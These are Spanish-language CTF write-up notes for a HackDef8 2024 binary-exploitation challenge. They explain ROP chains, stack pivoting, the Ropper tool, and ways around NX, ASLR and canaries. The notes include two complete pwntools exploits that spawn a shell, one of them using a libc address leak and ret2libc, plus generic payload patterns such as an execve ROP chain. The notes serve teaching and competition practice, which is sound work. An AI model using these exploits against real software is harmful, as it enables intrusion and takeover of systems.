---
tags:
  - ROPchain
  - stackpivoting
---

# Notas del Reto de PWN - HackDef8 2024

## ¿Qué carajos es un gadget? ¿Qué demonios es ROPchain?

### ROPchain: El Arte de Hackear con lo que Ya Hay

Imagina que quieres que un programa haga algo que no fue diseñado para hacer (como ejecutar un comando malicioso), pero el sistema operativo tiene medidas de seguridad que te lo impiden. Una de estas medidas es marcar la memoria donde está tu código como "no ejecutable".

La ROPchain es una técnica brillante para bypassear esa protección.

#### La Analogía del "Frankenstein" del Código

Piensa en un programa como un libro gigante lleno de instrucciones (el código).

**El Problema:** No puedes agregar tus propias páginas (tu código malicioso) porque el sistema las marca y no las lee.

**La Solución ROP:** En lugar de escribir páginas nuevas, tomas pequeños fragmentos de texto que ya están en el libro (usualmente al final de un párrafo, justo antes de un punto y aparte). Cada uno de estos fragmentos hace algo mínimo, como "mover un dato", "sumar un número" o "guardar un valor en un lugar específico".

**La "Cadena" (Chain):** Tomas estos fragmentos, los ensartas en el orden correcto, y logras que, al leerlos uno tras otro, realicen la tarea compleja que tú quieres (como abrir una shell). Esto es la ROPchain: una cadena de estos fragmentos de código preexistentes.

---

### Desglosando los Términos Técnicos

#### 1. ROP (Return-Oriented Programming)

**Return-Oriented:** Se centra en la instrucción `ret` (return). Esta instrucción le dice al procesador: "saca la siguiente dirección de la pila (stack) y salta a ella".

##### ¿Cómo funciona?

**Desbordamiento de Búfer:** Primero, logras sobreescribir la pila (stack) del programa. Allí pones una serie de direcciones de memoria.

**Gadgets:** Cada una de estas direcciones no apunta a tu código, sino a un "gadget" dentro del propio programa. Un gadget es una pequeña secuencia de instrucciones (normalmente 2-5) que termina con un `ret`.

**Cadena de Retornos:** Cuando la función vulnerable hace su `ret`, en vez de volver al sitio correcto, salta a tu primer gadget. Este gadget hace su mini-tarea y, al final, ejecuta su `ret`. Ese `ret` saca la siguiente dirección de la pila que tú preparaste, saltando al siguiente gadget, y así sucesivamente.

**Tú controlas el flujo del programa controlando lo que hay en la pila.**

#### 2. Chain (Cadena)

Es la lista ordenada de direcciones de memoria de estos gadgets. Cada gadget realiza una pequeña parte de la lógica del ataque, y al encadenarlos, construyes una funcionalidad completa.

---

### Un Ejemplo Súper Sencillo de una ROPchain

**Objetivo:** Ejecutar `/bin/sh` para obtener una shell.

No puedes simplemente inyectar el código que llama a `system("/bin/sh")`. En su lugar, construyes una ROPchain:

1. **Gadget 1 (Cargar el string):** Un gadget que pone la dirección de la cadena `"/bin/sh"` en un registro (ej. `rdi`), que es donde en x64 se espera el primer argumento de una función.

2. **Gadget 2 (Preparar el llamado):** Quizás necesites un gadget para limpiar otros registros o ajustar `rsp`.

3. **Dirección de `system()`:** En la pila, pones la dirección de la función `system()` de la librería C. Cuando el gadget anterior haga `ret`, saltará a `system`. Y `system` encontrará en `rdi` la cadena `"/bin/sh"` que le preparó el primer gadget.

**¡BOOM!** Se ejecuta `system("/bin/sh")` y obtienes tu shell.

Tu pila, durante el exploit, se vería así (de arriba hacia abajo):
```
[Gadget 1: "pop rdi; ret"]           --> Saca la siguiente dirección de la pila y la pone en RDI
[Dirección de la cadena "/bin/sh"]   --> Lo que "pop rdi" sacará de la pila
[Dirección de system()]              --> El 'ret' de Gadget 1 salta aquí
... (y así sucesivamente para cadenas más complejas)
```

---

### ¿Por qué es Tan Poderosa/Peligrosa?

**No ejecuta código nuevo:** Solo usa código legítimo del programa, por lo que las defensas que buscan código inyectado fallan.

**Es Turing-completa:** En teoría, puedes construir cualquier lógica computacional solo con gadgets ROP, lo que la hace increíblemente poderosa.

---

### Resumen en Términos de "Pwning"

Un **ROPchain** es el "arma" final que construye un hacker de binarios después de encontrar una vulnerabilidad de desbordamiento de búfer. Es la cadena de instrucciones ensamblada a partir de los propios fragmentos del programa vulnerable para tomar el control (pwnearlo) y hacer que obedezca tus órdenes.

Es una de las técnicas más elegantes y complejas en el mundo del pwning. ¡Dominarla es un gran logro!

---

## Stack Pivoting

Mientras que **ROPchain** es el "qué" (la cadena de instrucciones), **Stack Pivoting** es a menudo el "cómo" (la técnica para hacerla posible).

### Stack Pivoting: Mover el Campo de Batalla

**La idea central:** Es la técnica de cambiar el puntero de la pila (registro `RSP`/`ESP`) de la pila legítima del programa a una región de memoria que tú controlas por completo.

#### La Analogía del Tablero de Juego

Imagina que estás jugando un juego de mesa (el programa) con reglas estrictas:

**La Pila Original:** Es el tablero de juego oficial. Tienes pocas piezas y no puedes colocar las tuyas.

**El Stack Pivot:** Es como agarrar todo el tablero y moverlo a un garage gigante que tienes lleno de todas las piezas, herramientas y trampas que preparaste de antemano.

**La Nueva Pila:** Ese garage es la nueva región de memoria (ej., el heap o un búfer grande) donde tienes tu ROPchain completa ya escrita y lista para ser ejecutada.

---

### ¿Por Qué es Necesario?

En un desbordamiento de búfer típico, tienes espacio limitado en la pila para escribir tu exploit. Puede que no quepa toda tu ROPchain, o que el programa empiece a sobrescribir tus propios datos.

**El Stack Pivot soluciona esto:** Te permite "mudarte" a un espacio de memoria más grande y controlado donde puedes desplegar tu ROPchain completa sin restricciones.

---

### ¿Cómo Funciona Técnicamente?

1. **Preparas el Nuevo "Stack":** En el heap o en un búfer grande, escribes toda tu ROPchain completa.

2. **Encuentras un "Gadget Pivot":** Buscas en el binario un gadget específico que te permita cargar un nuevo valor en el registro `RSP`. Los gadgets clásicos son:
   - `xchg rsp, rax` (o cualquier otro registro)
   - `mov rsp, rax`
   - `pop rsp` (¡Este es el "Santo Grial" del stack pivoting! Si puedes controlar lo que se "popea", controlas `RSP`).

3. **Ejecutas el Pivot:** Tu exploit inicial (en el desbordamiento de la pila legítima) es muy corto. Su única misión es:
   - a. Cargar la dirección de tu nueva "pila" falsa (el búfer con la ROPchain) en un registro (ej., `RAX`).
   - b. Llamar al gadget pivote (`pop rsp`, `xchg rsp, rax`, etc.).

4. **¡El Cambio!** En el momento en que se ejecuta el gadget pivote, `RSP` salta de la pila legítima a la dirección de tu búfer controlado.

5. **La Magia de ROP Comienza:** La siguiente instrucción que se ejecutará será un `ret`. ¿Y qué hace `ret`?
   - Saca la siguiente dirección de la pila actual (que ahora es tu búfer controlado).
   - Y salta a ella.
   - ¡Pero en tu búfer controlado, lo primero que pusiste fue la dirección de tu primer gadget de la ROPchain!

Desde este momento, la CPU está "leyendo" tu búfer como si fuera la pila, y tu ROPchain se ejecuta felizmente.

---

### Relación con ROPchain

Son dos caras de la misma moneda:

- **ROPchain:** El plan de ataque, la lógica, la secuencia de instrucciones.
- **Stack Pivoting:** El movimiento táctico que te permite colocar y ejecutar ese plan de manera efectiva.

**Un flujo típico de exploit:**
```
Desbordamiento → Mini-ROP (o código) para hacer Stack Pivot → RSP se mueve a un búfer grande → ROPchain principal se ejecuta → ¡Pwned!
```

---

### Resumen en Términos de Pwning

**Stack Pivoting** es como hacer un "teletransporte" de la pila. Es la técnica crítica que usas cuando el espacio de explotación original es demasiado pequeño, permitiéndote reubicar toda la ejecución de tu ROPchain a un "paraíso" de memoria que tú controlas.

Es una técnica esencial para exploits reales y modernos. Si dominas ROP y Stack Pivoting, ya tienes un arsenal poderosísimo para el pwning de binarios.

¡Es una pregunta excelente que muestra que estás yendo al grano de la exploitación avanzada!

---

## Cómo Sacar un Stack-Pivot con Ropper

Hay una herramienta para hacer esto, se llama **Ropper**.
```bash
ropper --file chal --stack-pivot
```

Antes que eso, una descripción de qué es Ropper:

### Ropper

**En resumen:** Ropper es una herramienta excelente, poderosa y que ahorra mucho tiempo, pero como cualquier herramienta avanzada, tiene sus matices.

#### Lo Bueno (Por qué es tan Querido)

**Velocidad y Eficiencia:** Comparado con su predecesor clásico (ROPgadget), Ropper es generalmente más rápido para analizar binarios grandes. Esto es un gran alivio cuando estás probando múltiples bins.

**Búsquedas Muy Poderosas:** Su sintaxis de búsqueda es flexible y potente. No solo buscas instrucciones, puedes buscar gadgets complejos.

- **Ejemplo:** Puedes buscar `"pop rdi; ret"` directamente, o cosas más específicas como `"mov [rax], rdx; ret"`.

**Soporte para Múltiples Arquitecturas:** No solo es para x86/x64. Soporta ARM, MIPS, PowerPC, etc. Esto es invaluable en el mundo del IoT pwning.

**Características Avanzadas Útiles:**

- **`--stack-pivot`:** ¡Te filtra solo los gadgets útiles para stack pivoting! (como `pop rsp`, `xchg rsp, rax`, etc.). Esto es ENORME y ahorra horas.
- **`--badbytes`:** Te permite excluir gadgets cuyas direcciones contengan bytes malos (muy común en exploits de cadena).
- **`--opcode`:** Puedes buscar gadgets por sus bytes en crudo (opcodes), útil para bypasses.

**Cadenas Mágicas:** Puede buscar direcciones útiles en el binario, como la cadena `"/bin/sh"` o la dirección de la función `system`.

**Salida Formateable:** Puedes obtener la salida en texto plano, colorizado, o incluso en formato para copiar y pegar directamente en tu exploit.

---

#### Lo "Malo" o los Matices (Más que cosas malas, son advertencias)

**Puede Ser un "Martillo Demasiado Grande":** Para binarios pequeños o problemas simples de CTF, a veces `objdump` o una búsqueda manual con `gdb` es más rápida que esperar a que Ropper analice todo.

**La Maldición de la Abundancia:** A veces te devuelve demasiados gadgets. Puedes terminar con 20 versiones de `"pop rdi; ret"` en direcciones ligeramente diferentes, y elegir la correcta (que no tenga bytes malos, que esté en una sección ejecutable fiable, etc.) requiere criterio humano.

**No Reemplaza el Entendimiento:** Esta es la más importante. Ropper es un asistente, no un reemplazo para el conocimiento.

- Si no entiendes por qué necesitas un gadget de `"pop rdi"`, Ropper no te lo va a explicar.
- Si no entiendes cómo funciona el stack pivoting, la opción `--stack-pivot` será solo un comando mágico.

**Puede Haber Falsos Positivos o Gadgets "Rotos":** A veces encuentra secuencias de bytes que parecen gadgets pero que en realidad no son útiles porque, por ejemplo, corrompen un registro crucial justo antes del `ret`. Siempre hay que verificar los gadgets en un depurador.

---

#### Comparación Rápida con Otras Herramientas

**vs ROPgadget:** Ropper es como el sucesor más moderno y rápido. ROPgadget es el clásico confiable, pero para bins grandes puede ser dolorosamente lento.

**vs pwntools (ROP module):** pwntools es un framework completo. Su módulo ROP es increíble porque automatiza la construcción de cadenas. Le das "quiero llamar a `system('/bin/sh')`" y él busca los gadgets por ti. Es el siguiente nivel de abstracción. Ropper es más para cuando quieres control manual total.

---

#### Veredicto Final

Ropper es una herramienta de primera línea, altamente recomendada.

**Para principiantes:** Está bien usarla, pero obligatoriamente debes cruzar la información con un depurador (`gdb`) y asegurarte de entender qué hace cada gadget que usas. Si no, te conviertes en un "script kiddie" de ROP.

---

### Volvamos al Comando
```bash
ropper --file binario --stack-pivot
```

Gato lo ejecutó y le salió:
```
//HackDef > ropper --file chal --stack-pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
==========================

0x08049102: add esp, 0x10; leave; ret;
0x08049111: add esp, 8; pop ebx; ret; <- este es el de interés, como el texto de arriba lo sugirió pop es oro, pero ¿ahora no?
0x08049219: ret 0x45b0;
0x08049213: ret 0xb60f;
0x08049216: ret 0xc873;
0x08049220: ret 0xe8c1;

6 gadgets found
//HackDef >
```

Pero dijo: **realmente lo mejor sería un `add esp, 8; ret`, ya que ese `pop ebx` nos va a quitar un double word de más y no queremos eso**.

**Explicación:**

---

### El Problema del `pop ebx` Extra

Imagina que tu pila (después del stack pivot) está perfectamente alineada con tu ROPchain. Es como una fila de dominó perfecta para que caigan uno tras otro.
```
[Gadget 1]
[Gadget 2] 
[Gadget 3]
...
```

Cuando usas el gadget `add esp, 8; pop ebx; ret;`, esto es lo que pasa:

1. **`add esp, 8`** - Salta 8 bytes en la pila (2 valores de 4 bytes). Esto está bien si lo tenías planeado (que fue así para Gato).
2. **`pop ebx`** - Saca 4 bytes MÁS de la pila y los mete en el registro `EBX`.
3. **`ret`** - Finalmente, salta a la dirección que ahora está en el tope de la pila.

**El problema:** Ese `pop ebx` no es gratis. Necesita consumir un espacio adicional de 4 bytes de tu cadena que no estaba haciendo nada útil, solo llenando el registro `EBX` con basura.

---

### La Diferencia Práctica en el Exploit

**Con `add esp, 8; pop ebx; ret;`:**

Tu pila tendría que verse así:
```
[Gadget: add esp, 8; pop ebx; ret;]  <-- RSP apunta aquí al hacer el pivot
[DIR_Basura_1]  // Los 8 bytes que "add esp, 8" se salta
[DIR_Basura_2]
[DIR_Basura_Para_EBX] // El valor que "pop ebx" consumirá
[Gadget 1 de la ROPchain] // <- Aquí salta el 'ret' FINALMENTE
[Gadget 2]
...
```

**Con el gadget ideal `add esp, 8; ret;` (que no encontraron):**

Tu pila sería mucho más limpia:
```
[Gadget: add esp, 8; ret;]  <-- RSP apunta aquí al hacer el pivot
[DIR_Basura_1]  // Los 8 bytes que "add esp, 8" se salta
[DIR_Basura_2]
[Gadget 1 de la ROPchain] // <- Aquí salta el 'ret' INMEDIATAMENTE
[Gadget 2]
...
```

---

### ¿Por Qué es Mejor el Segundo Escenario?

**Precisión:** No tienes que lidiar con un registro extra (`EBX`) siendo modificado con un valor que no controlas o no te importa.

**Simplicidad:** Tu cadena es más corta y directa. Un gadget menos del que preocuparte.

**Confiabilidad:** Menos cosas que puedan salir mal. ¿Y si ese valor que cae en `EBX` es crucial para otro gadget después? Mejor no tocarlo.

---

### ¿Entonces el Gadget con `pop ebx` es Inútil?

¡Para nada! El gadget que encontraron SÍ es útil y se puede usar. Gato solo está señalando que hay uno mejor que no encontraron.

En la práctica, si necesitas hacer un stack pivot y este es el único gadget que tienes, lo usas sin problema. Solo significa que en tu exploit tendrás que poner un valor de relleno extra (los 4 bytes para el `pop ebx`) en la posición correcta.

Gato está pensando de manera óptima: "¿Cuál es la herramienta perfecta para el trabajo?" Y `add esp, 8; ret` es más perfecta que `add esp, 8; pop ebx; ret` para un stack pivot limpio.

---

### Resumen

Tu amigo Gato tiene razón. El `pop ebx` extra:

1. Consume 4 bytes adicionales de tu pila controlada que no aportan a la lógica del exploit.
2. Modifica un registro (`EBX`) sin una razón útil, lo que podría potencialmente interferir con gadgets futuros en tu ROPchain.

Es un buen ejemplo de cómo en el pwning a veces tienes que conformarte con lo "suficientemente bueno" (`add esp, 8; pop ebx; ret`) cuando lo "perfecto" (`add esp, 8; ret`) no está disponible. ¡Pero siempre hay que apuntar a lo perfecto!

---

### La Misión del `add esp, 8`

El propósito del `add esp, 8` es "limpiar" o "saltar" esos primeros 8 bytes (DATO 1 y DATO 2) que están "ensuciando" el inicio de tu ROPchain. No son parte de tu exploit, son un residuo del estado anterior de la pila.

Después del `add esp, 8`, la pila queda así:
```
[ ... Búfer ... ]
[Gadget Pivote: add esp, 8; pop ebx; ret]
[DATO 1]  // (Saltado)
[DATO 2]  // (Saltado)
[DATO 3]  <-- ¡ESP apunta aquí ahora! Este será consumido por el `pop ebx`
[Gadget 1 de tu ROPchain] <-- Después del `pop ebx`, ESP apuntará aquí, listo para el `ret`
```

---

## Exploit como Solución de Limpia de Buffer
```python
#!/usr/bin/python3
from pwn import *

shell = process("./chal")

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\x00"

payload = b""
payload += junk

for i in range(len(cmd)):
    payload += p32(0x80491f3)    # updateCommand()
    payload += p32(0x804901b)    # add esp, 8; pop ebx; ret;
    payload += p32(i)            # index
    payload += p32(u8(cmd[i:i+1])) # character
    payload += p32(0x41414141)   # padding for pop

payload += p32(0x804921d) # execCommand()

shell.sendlineafter(b",...\n", payload)
shell.interactive()
```

Este es un exploit de escritura de memoria + ROP. Vamos a desglosarlo paso a paso.

---

### ¿Qué Está Haciendo Este Exploit?

**Objetivo:** Escribir la cadena `"/bin/sh"` en memoria (posiblemente en el búfer global `command`), y luego ejecutarla.

**Problema:** Necesitan llamar muchas veces a `updateCommand()` (una vez por cada carácter de `"/bin/sh"`), pero cada llamada ensucia el stack con argumentos.

**Solución:** Usar el gadget `add esp, 8; pop ebx; ret` como "limpiador de stack" entre cada llamada.

---

### Análisis Paso a Paso

#### 1. Estructura de una Iteración (por carácter)

Para cada carácter de `"/bin/sh"`, el payload tiene:
```
[0x80491f3]  # Dirección de updateCommand() - La función que escribe el carácter
[0x804901b]  # Gadget "limpiador" (add esp, 8; pop ebx; ret)
[i]          # Primer argumento: índice
[char]       # Segundo argumento: el carácter
[0x41414141] # Relleno para el pop ebx del gadget
```

---

#### 2. ¿Qué Pasa en la Ejecución?

Cuando se ejecuta una iteración:

1. `ret` salta a `updateCommand(índice, carácter)`
2. La función usa sus dos argumentos de la pila
3. Al terminar, hace `ret`
4. El `ret` de `updateCommand()` salta al **GADGET LIMPIADOR**
5. `add esp, 8`: Salta los 2 argumentos que ya se usaron (`i` y `char`)
6. `pop ebx`: Saca el valor de relleno (`0x41414141`) y lo mete en `EBX`
7. `ret`: ¡Listo! El stack está limpio para la siguiente iteración

---

#### 3. El Stack Durante la Ejecución
```
# AL INICIAR UNA ITERACIÓN:
[updateCommand]  <-- EIP salta aquí
[gadget_limpiador]
[i]              # arg1
[char]           # arg2  
[padding]        # para pop ebx
[siguiente_iteración...]

# DESPUÉS DE updateCommand():
[gadget_limpiador]  <-- EIP salta aquí (ret de updateCommand)
[i]              # ¡ESTOS ARGUMENTOS YA SE USARON!
[char]           # ¡SON BASURA AHORA!
[padding]        
[siguiente_iteración...]

# DESPUÉS DEL GADGET LIMPIADOR:
[gadget_limpiador]  
[i]              # Saltados por add esp, 8
[char]           # Saltados por add esp, 8  
[padding]        # Consumido por pop ebx
[siguiente_iteración]  <-- ESP apunta aquí ¡LISTO!
```

---

#### 4. Al Final

Después de escribir todos los caracteres de `"/bin/sh\x00"`:
```
[execCommand()]  # Ejecuta el comando que acabamos de escribir
```

---

### Resumen

Este exploit usa el stack pivoting a micro-escala para construir una cadena en memoria carácter por carácter, limpiando el stack entre cada operación. Es una técnica muy elegante para cuando no tienes un solo búfer grande donde escribir toda tu cadena de una vez.

Tu amigo Gato realmente sabe lo que hace. ¡Este es un exploit de nivel intermedio-avanzado muy bien construido!

---

## La Tercera Solución: Haciendo un Leak de libc

Que el binario dé una dirección que vive en libc y a partir de calcular esa dirección restamos su offset, calculamos las direcciones de `system` y `/bin/sh`.

### Comandos que Vi en Explicación de GDB que Me Parecieron Útiles
```bash
got -r puts
x/i 
vmmap
```

### Para Sacar el Offset de `system` y `exit`:
```bash
ldd chal  # para sacar la ruta de libc

readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system@@
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit@@

libcdb file <ruta libc>
```

**El exploit que salió es delicado pues dependiendo de la versión de libc puede cambiar los offsets y hacer que no cuadre nada.**

---

### Exploit Final
```python
#!/usr/bin/python3
from pwn import *

shell = process("../chal")

offset = 268
junk = b"A" * offset

payload = b""
payload += junk
payload += p32(0x8049050) # puts@plt
payload += p32(0x8049248) # vuln()
payload += p32(0x804c008) # puts@got

shell.sendlineafter(b"....\n", payload)
libc_base = u32(shell.recv(4)) - 0x78140

payload = b""
payload += junk
payload += p32(libc_base + 0x05b430) # system()
payload += p32(libc_base + 0x03ebd0) # exit()
payload += p32(libc_base + 0x1c4de8) # "/bin/sh"

shell.sendlineafter(b"....\n", payload)
shell.interactive()
```

---

### Explicando un Poco

#### Fase 1: El Leak de libc
```python
payload = b""
payload += junk
payload += p32(0x8049050) # puts@plt
payload += p32(0x8049248) # vuln()
payload += p32(0x804c008) # puts@got
```

**¿Qué está haciendo aquí?**

- **`junk`:** Rellena el búfer hasta sobreescribir el EIP.
- **`puts@plt`:** La dirección de `puts` en la PLT (Procedure Linkage Table). Esto hace que el programa llame a `puts()`.
- **`vuln()`:** La dirección de retorno después de que `puts` termine. Esto es crucial: hace que el programa vuelva a la función vulnerable para un segundo ataque.
- **`puts@got`:** La dirección de `puts` en la GOT (Global Offset Table). Esto será el argumento para `puts()`.

**En español claro:**

"Ejecuta `puts(puts@got)` para que imprima en pantalla la dirección real de `puts` en libc, y luego vuelve a `vuln()` para que pueda explotarte de nuevo."

**La magia:** `puts(puts@got)` imprime 4 bytes de memoria que contienen la dirección real de `puts` en libc. Como conocemos el offset de `puts` en la libc específica (`0x78140`), podemos calcular la base de libc:
```python
libc_base = u32(shell.recv(4)) - 0x78140
```

**¡Ahora sabemos dónde está TODO en libc!**

---

#### Fase 2: Ret2libc (El Ataque Final)
```python
payload = b""
payload += junk
payload += p32(libc_base + 0x05b430) # system()
payload += p32(libc_base + 0x03ebd0) # exit()
payload += p32(libc_base + 0x1c4de8) # "/bin/sh"
```

Ahora el payload es:

1. **`system()`** (dirección real en libc)
2. **`exit()`** (para una salida limpia)
3. **`"/bin/sh"`** (cadena que ya existe en libc)

**En español:**

"Ejecuta `system("/bin/sh")` para obtener una shell, y luego llama a `exit()` para salir limpiamente."

---

### ¿Por Qué Este Exploit es Tan Bueno?

**BYPASEA ASLR:** Esta es la parte más importante. La Fase 1 derrota el ASLR (Address Space Layout Randomization) filtrando una dirección de libc.

**BYPASEA DEP/NX:** No inyecta shellcode, solo usa código que ya existe (en libc), así que evade la protección "No-eXecute".

**Reutilización del Bug:** Explota la misma vulnerabilidad dos veces de manera inteligente.

**Confiabilidad:** Una vez que tienes la base de libc, el segundo ataque es

100% confiable.

---

## Notas Finales y Lecciones Aprendidas

### Conceptos Clave del Exploit con libc Leak

El exploit de leak de libc es una técnica de dos etapas que demuestra la importancia de:

1. **Reconocimiento de Información (Information Disclosure):** La primera fase no busca ejecutar código malicioso, sino extraer información valiosa del proceso en ejecución.
2. **Reutilización de Vulnerabilidad:** Al hacer que el programa vuelva a la función vulnerable (`vuln()`), podemos explotar el mismo bug múltiples veces en una sola sesión.
3. **Cálculo de Offsets:** Una vez que conocemos una dirección base, podemos calcular cualquier otra dirección en esa misma región de memoria usando offsets conocidos.

---

### Comparación de las Tres Técnicas

#### 1. ROPchain Pura

- **Ventajas:** No depende de funciones específicas de libc, más portable entre versiones.
- **Desventajas:** Requiere muchos gadgets, la cadena puede ser larga y compleja.
- **Mejor para:** Binarios con muchas protecciones pero buenos gadgets disponibles.

#### 2. Stack Pivoting + ROPchain

- **Ventajas:** Permite exploits más largos y complejos, más espacio para trabajar.
- **Desventajas:** Requiere un gadget de pivote específico, más complejo de debuggear.
- **Mejor para:** Cuando el espacio en el stack original es muy limitado.

#### 3. Leak de libc + Ret2libc

- **Ventajas:** Exploit más corto y limpio, muy confiable una vez que tienes los offsets correctos.
- **Desventajas:** Depende de la versión específica de libc, necesita dos fases.
- **Mejor para:** Cuando el binario tiene funciones de output que puedes abusar (como `puts`, `printf`, `write`).

---

### Tips Importantes para Recordar

#### Sobre Gadgets

- Un `pop` seguido de `ret` es oro porque te permite controlar registros.
- Siempre verifica los gadgets en un debugger antes de usarlos en tu exploit.
- Los gadgets con menos instrucciones son generalmente mejores (menos efectos secundarios).

#### Sobre Stack Pivoting

- El gadget ideal es `pop rsp; ret` pero es extremadamente raro.
- `xchg rsp, rax; ret` y `mov rsp, rax; ret` son alternativas excelentes.
- Siempre considera el costo de instrucciones extra como `pop ebx`.

#### Sobre Leaks de libc

- Necesitas una función que imprima datos (puts, printf, write).
- La GOT es tu mejor amiga para leaks - contiene direcciones reales de libc.
- Siempre verifica la versión de libc del sistema objetivo.
- Usa herramientas como `libc-database` o `libcdb` para identificar versiones de libc a partir de offsets.

#### Sobre Debugging

- `gdb` con `pwndbg` o `gef` es esencial.
- Usa breakpoints en los gadgets para verificar el estado de los registros.
- `vmmap` te muestra el layout de memoria completo.
- `got` y `plt` son comandos útiles en `pwndbg` para ver las tablas.

---

### Herramientas del Arsenal de Pwning

#### Análisis Estático

- **`ropper`:** Búsqueda de gadgets ROP
- **`ROPgadget`:** Alternativa clásica a ropper
- **`readelf`:** Inspección de símbolos y secciones de ELF
- **`objdump`:** Desensamblado de binarios
- **`checksec`:** Verificar protecciones del binario

#### Análisis Dinámico

- **`gdb`** con extensiones (`pwndbg`, `gef`, `peda`): Debugging interactivo
- **`ltrace`:** Rastreo de llamadas a librerías
- **`strace`:** Rastreo de syscalls

#### Desarrollo de Exploits

- **`pwntools`:** Framework completo de Python para exploits
- **`libc-database`:** Base de datos de versiones de libc
- **`one_gadget`:** Encuentra gadgets que dan shell directamente en libc

---

### Comandos GDB Útiles para Pwning


```bash
# Comandos básicos
break *0x08049248        # Breakpoint en dirección específica
run < payload.txt        # Ejecutar con input desde archivo
ni                       # Next instruction (step over)
si                       # Step instruction (step into)
continue                 # Continuar ejecución

# Inspección de memoria
x/20wx $esp             # Examinar 20 words en el stack
x/i $eip                # Examinar instrucción en EIP
x/s 0x0804a000          # Examinar string en dirección

# Con pwndbg/gef
vmmap                   # Ver mapa de memoria
got                     # Ver Global Offset Table
plt                     # Ver Procedure Linkage Table
checksec                # Ver protecciones del binario
rop                     # Buscar gadgets ROP
search "/bin/sh"        # Buscar strings en memoria
telescope $esp 20       # Ver stack de manera visual
```

### Protecciones Comunes y Cómo Bypassearlas

#### NX/DEP (No-eXecute / Data Execution Prevention)

- **Qué hace:** Marca el stack como no ejecutable
- **Bypass:** ROP, ret2libc - no inyectas código nuevo, usas el existente

#### ASLR (Address Space Layout Randomization)

- **Qué hace:** Randomiza direcciones de memoria en cada ejecución
- **Bypass:** Leaks de información para calcular direcciones reales

#### Stack Canaries

- **Qué hace:** Coloca un valor secreto en el stack que se verifica antes de retornar
- **Bypass:** Leak del canary, o sobreescribirlo con su valor correcto

#### PIE (Position Independent Executable)

- **Qué hace:** El binario mismo está en direcciones aleatorias
- **Bypass:** Leak de dirección del binario para calcular offsets

#### RELRO (Relocation Read-Only)

- **Full RELRO:** GOT es read-only después de la inicialización
- **Partial RELRO:** GOT puede ser modificada
- **Bypass (Full):** No puedes sobrescribir GOT, usa otras técnicas

---

### Workflow Típico de un Reto PWN
1. **Reconocimiento**

```bash
   file binary
   checksec binary
   strings binary
```

2. **Análisis Estático**

```bash
   objdump -d binary
   readelf -s binary
   ropper --file binary
```

3. **Análisis Dinámico**

```bash
   gdb binary
   # Buscar la vulnerabilidad
   # Calcular el offset
```

4. **Desarrollo del Exploit**
    - Crear exploit básico
    - Probar localmente
    - Ajustar para el entorno remoto
5. **Refinamiento**
    - Manejar casos edge
    - Hacer el exploit confiable
    - Optimizar la cadena ROP
### Patrones Comunes en CTFs

#### Pattern 1: Buffer Overflow Simple

```python
offset = 268
payload = b"A" * offset + p32(win_function)
```

#### Pattern 2: Ret2libc Básico


```python
payload = junk + p32(system) + p32(exit) + p32(binsh)
```

#### Pattern 3: Leak + Exploit


```python
# Fase 1: Leak
payload1 = junk + p32(puts_plt) + p32(main) + p32(got_entry)

# Fase 2: Exploit con direcciones calculadas
payload2 = junk + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)
```

#### Pattern 4: ROPchain para syscall


```python
# execve("/bin/sh", NULL, NULL)
payload = junk
payload += p32(pop_eax) + p32(0xb)          # eax = 11 (execve)
payload += p32(pop_ebx) + p32(binsh_addr)   # ebx = "/bin/sh"
payload += p32(pop_ecx) + p32(0)            # ecx = NULL
payload += p32(pop_edx) + p32(0)            # edx = NULL
payload += p32(int_0x80)                     # syscall
```

---

### Errores Comunes y Cómo Evitarlos

#### Error 1: No alinear el stack correctamente

- **Problema:** Los argumentos de función no están donde la función los espera
- **Solución:** Usar gadgets de limpieza como `add esp, 8` o `pop; pop; ret`

#### Error 2: Bytes nulos en direcciones

- **Problema:** Funciones como `strcpy` se detienen en `\x00`
- **Solución:** Buscar gadgets en direcciones sin bytes nulos, o usar otras funciones de input

#### Error 3: No considerar el alignment de x64

- **Problema:** En x64, el stack debe estar alineado a 16 bytes antes de `call`
- **Solución:** Agregar un `ret` extra antes de llamar funciones

#### Error 4: Offsets incorrectos de libc

- **Problema:** El exploit funciona local pero no remoto
- **Solución:** Usar múltiples leaks para identificar la versión exacta de libc

#### Error 5: No manejar buffering de stdio

- **Problema:** El output no aparece cuando lo esperas
- **Solución:** Usar `shell.recvuntil()`, `shell.recvline()`, o agregar `\n` a los payloads

---

### Recursos para Seguir Aprendiendo

#### Plataformas de Práctica

- **pwnable.kr:** Excelente para principiantes
- **pwnable.tw:** Nivel intermedio a avanzado
- **ROP Emporium:** Específico para aprender ROP
- **CTFtime:** Encuentra CTFs en vivo

#### Lecturas Recomendadas

- **"Hacking: The Art of Exploitation"** - Jon Erickson
- **"The Shellcoder's Handbook"** - Varios autores
- **"Practical Binary Analysis"** - Dennis Andriesse

#### Documentación Importante

- pwntools documentation: `docs.pwntools.com`
- Linux syscall reference: `syscalls.kernelgrok.com`
- Intel x86 manual: Para entender instrucciones en profundidad

---

### Conclusión

El pwning de binarios es un arte que combina:

- Conocimiento profundo de arquitectura de computadoras
- Comprensión de cómo funcionan los sistemas operativos
- Creatividad para encadenar primitivas simples en ataques complejos
- Paciencia y persistencia para debuggear exploits

Las tres técnicas cubiertas en este documento (ROPchain, Stack Pivoting, y Leak de libc) son fundamentales y se combinan de diferentes formas en exploits del mundo real.

**Recuerda:**

- Siempre verifica tus gadgets en un debugger
- Entiende cada paso de tu exploit, no solo copies y pegues
- La práctica constante es clave - cada reto te enseña algo nuevo
- La comunidad de pwning es muy colaborativa - no dudes en preguntar

¡Sigue practicando y pwneando! 🚀